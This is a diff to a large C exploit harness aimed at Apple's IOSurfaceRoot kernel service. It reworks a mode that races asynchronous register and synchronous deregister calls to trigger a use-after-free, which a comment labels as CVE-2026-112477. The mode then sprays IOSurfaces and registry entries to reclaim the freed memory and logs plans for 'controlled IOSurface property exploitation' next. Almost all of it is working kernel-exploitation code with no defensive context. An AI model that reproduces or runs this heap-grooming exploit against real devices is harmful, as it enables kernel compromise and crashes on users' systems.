@@ -24994,8 +24994,9 @@ new_modes:
              */
             if (rounds == 206) {
                 rlog("\n=== r=206: Same-type reclaim UAF stabilization ===\n");
+                rlog("  Phase A: Race-triggered UAF + same-type surface spray\n");
                 int r206_spray = 200;
-                int r206_races = 20;
+                int r206_races = 10;
                 if (argc > 3) r206_spray = atoi(argv[3]);
                 if (argc > 4) r206_races = atoi(argv[4]);
                 if (r206_spray < 10) r206_spray = 10;
@@ -25008,7 +25009,6 @@ new_modes:
                     IOServiceMatching("IOSurfaceRoot"));
                 if (!r206_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r206_done; }
 
-                /* Pre-create surface properties dict (reused for all sprays) */
                 CFMutableDictionaryRef r206_props = CFDictionaryCreateMutable(NULL, 0,
                     &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                 int r206_w = 32, r206_h = 32, r206_bpe = 4;
@@ -25023,42 +25023,40 @@ new_modes:
                 CFDictionarySetValue(r206_props, CFSTR("IOSurfacePixelFormat"), r206_pfn);
 
                 int r206_survived = 0;
-                int r206_panicked = 0; /* we can only count these if we survive */
 
                 for (int race = 0; race < r206_races; race++) {
                     rlog("\n  --- Race attempt %d/%d ---\n", race + 1, r206_races);
 
-                    /* Step 1: Open multiple connections and register entries */
-                    io_connect_t r206_conns[8];
-                    int r206_nconns = 0;
-                    for (int i = 0; i < 8; i++) {
-                        io_connect_t c = IO_OBJECT_NULL;
-                        if (IOServiceOpen(r206_svc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
-                            r206_conns[r206_nconns++] = c;
-                        }
-                    }
-                    rlog("  Opened %d connections\n", r206_nconns);
+                    /* Open race connection */
+                    io_connect_t r206_rc = IO_OBJECT_NULL;
+                    IOServiceOpen(r206_svc, mach_task_self(), 0, &r206_rc);
+                    if (!r206_rc) { rlog("  open failed\n"); continue; }
 
-                    /* Register entries on each connection */
-                    for (int i = 0; i < r206_nconns; i++) {
+                    /* Tight race loop: sel17 (async register) + sel18 (sync deregister)
+                     * on the SAME connection with SAME input data.
+                     * This is the actual CVE-2026-112477 trigger. */
+                    uint64_t r206_inp[3] = {1, 2, 3};
+                    int r206_anomalies = 0;
+
+                    for (int i = 0; i < 50; i++) {
                         mach_port_t wp = MACH_PORT_NULL;
                         mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
                         mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
                         uint64_t ref = 0xD206 + i;
-                        uint64_t inp[3] = {1, 2, 3};
-                        IOConnectCallAsyncMethod(r206_conns[i], 17, wp, &ref, 1,
-                            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+
+                        /* Race: register async... */
+                        kern_return_t rr = IOConnectCallAsyncMethod(r206_rc, 17, wp, &ref, 1,
+                            NULL, 0, r206_inp, 24, NULL, NULL, NULL, NULL);
+                        /* ...immediately deregister sync (frees the entry) */
+                        kern_return_t rd = IOConnectCallMethod(r206_rc, 18, NULL, 0,
+                            r206_inp, 24, NULL, NULL, NULL, NULL);
+
+                        if ((uint32_t)rr != 0 || (uint32_t)rd != 0) r206_anomalies++;
                         mach_port_deallocate(mach_task_self(), wp);
                     }
-                    rlog("  Registered %d entries\n", r206_nconns);
+                    rlog("  Race: 50 iterations, %d anomalies\n", r206_anomalies);
 
-                    /* Step 2: Close connections to free registry entries (UAF trigger) */
-                    for (int i = 0; i < r206_nconns; i++) {
-                        IOServiceClose(r206_conns[i]);
-                    }
-                    rlog("  Freed entries (closed connections)\n");
-
-                    /* Step 3: IMMEDIATELY spray real IOSurfaces to reclaim freed memory */
+                    /* IMMEDIATELY spray IOSurfaces to reclaim any freed objects */
                     IOSurfaceRef *r206_surfs = calloc(r206_spray, sizeof(IOSurfaceRef));
                     int r206_created = 0;
                     for (int i = 0; i < r206_spray; i++) {
@@ -25067,27 +25065,27 @@ new_modes:
                     }
                     rlog("  Sprayed %d/%d IOSurfaces\n", r206_created, r206_spray);
 
-                    /* Also register new entries via sel17 to reclaim registry entry slots */
-                    io_connect_t r206_reg_conn = IO_OBJECT_NULL;
-                    IOServiceOpen(r206_svc, mach_task_self(), 0, &r206_reg_conn);
-                    mach_port_t r206_reg_wps[256];
-                    int r206_reg_n = 0;
-                    if (r206_reg_conn) {
-                        for (int i = 0; i < 256 && i < r206_spray; i++) {
+                    /* Also spray registry entries via sel17 on a fresh connection */
+                    io_connect_t r206_spray_conn = IO_OBJECT_NULL;
+                    IOServiceOpen(r206_svc, mach_task_self(), 0, &r206_spray_conn);
+                    mach_port_t r206_spray_wps[256];
+                    int r206_spray_n = 0;
+                    if (r206_spray_conn) {
+                        for (int i = 0; i < 256; i++) {
                             mach_port_t wp = MACH_PORT_NULL;
                             mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
                             mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
                             uint64_t ref = 0x206000 + i;
                             uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
-                            IOConnectCallAsyncMethod(r206_reg_conn, 17, wp, &ref, 1,
+                            IOConnectCallAsyncMethod(r206_spray_conn, 17, wp, &ref, 1,
                                 NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
-                            r206_reg_wps[r206_reg_n++] = wp;
+                            r206_spray_wps[r206_spray_n++] = wp;
                         }
-                        rlog("  Registered %d new entries via sel17\n", r206_reg_n);
+                        rlog("  Sprayed %d registry entries via sel17\n", r206_spray_n);
                     }
 
-                    /* Step 4: Run render loop — this triggers compositor registry walk */
-                    rlog("  Starting render loop (3s)...");
+                    /* Run render loop to trigger compositor registry walk */
+                    rlog("  Render loop (3s)...");
                     p13_render_run = 1;
                     p13_render_frames = 0;
                     pthread_t r206_rt;
@@ -25100,19 +25098,20 @@ new_modes:
                     pthread_join(r206_rt, NULL);
                     rlog(" frames=%d\n", p13_render_frames);
 
-                    rlog("  *** SURVIVED race attempt %d! frames=%d ***\n",
-                         race + 1, p13_render_frames);
+                    rlog("  *** SURVIVED race %d! frames=%d anomalies=%d ***\n",
+                         race + 1, p13_render_frames, r206_anomalies);
                     r206_survived++;
 
-                    /* Cleanup spray */
+                    /* Cleanup */
+                    IOServiceClose(r206_rc);
                     for (int i = 0; i < r206_spray; i++) {
                         if (r206_surfs[i]) CFRelease(r206_surfs[i]);
                     }
                     free(r206_surfs);
-                    if (r206_reg_conn) {
-                        IOServiceClose(r206_reg_conn);
-                        for (int i = 0; i < r206_reg_n; i++)
-                            mach_port_deallocate(mach_task_self(), r206_reg_wps[i]);
+                    if (r206_spray_conn) {
+                        IOServiceClose(r206_spray_conn);
+                        for (int i = 0; i < r206_spray_n; i++)
+                            mach_port_deallocate(mach_task_self(), r206_spray_wps[i]);
                     }
                     usleep(100000);
                 }
@@ -25120,10 +25119,10 @@ new_modes:
                 rlog("\n=== r=206 RESULTS ===\n");
                 rlog("  Survived: %d/%d race attempts\n", r206_survived, r206_races);
                 if (r206_survived == r206_races) {
-                    rlog("  FULL SURVIVAL — same-type reclaim is working!\n");
+                    rlog("  FULL SURVIVAL — same-type reclaim stabilizes the UAF!\n");
                     rlog("  Next: r=207 for controlled IOSurface property exploitation\n");
                 } else {
-                    rlog("  Partial survival — reclaim probability may need tuning\n");
+                    rlog("  Partial survival — some races created unreclaimed stale entries\n");
                 }
 
                 CFRelease(r206_wn); CFRelease(r206_hn);
